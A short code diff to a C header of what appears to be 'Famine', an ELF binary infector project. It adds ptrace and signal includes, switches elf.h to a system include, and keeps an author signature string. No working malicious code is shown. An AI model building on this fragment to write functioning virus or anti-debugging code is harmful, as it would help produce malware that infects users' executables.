@@ -15,8 +15,11 @@
 # include <unistd.h>
 # include <fcntl.h>
 # include <sys/stat.h>
+# include <sys/ptrace.h>
+# include <sys/types.h>
+# include <signal.h>
 
-# include "elf.h"
+# include <elf.h>
 
 # include <inttypes.h>
 # define SIGN "Famine version 1.0 (c)oded by <jgounand>-<afiodier>"
